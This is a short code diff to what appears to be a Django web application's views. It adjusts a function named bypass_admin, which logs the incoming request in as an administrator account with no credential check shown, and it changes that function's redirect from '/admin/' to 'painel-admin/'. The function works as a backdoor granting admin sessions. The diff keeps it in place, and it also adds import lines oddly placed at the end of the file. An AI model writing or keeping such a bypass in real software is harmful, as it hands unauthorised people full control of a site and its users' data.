@@ -969,4 +969,9 @@ def bypass_admin(request):
     if admin_user:
         admin_user.backend = 'django.contrib.auth.backends.ModelBackend'
         auth_login(request, admin_user)
-    return redirect('/admin/')
+    return redirect('painel-admin/')
+
+from django.contrib.auth import login as auth_login
+from django.contrib.auth.models import User
+from django.shortcuts import redirect
+
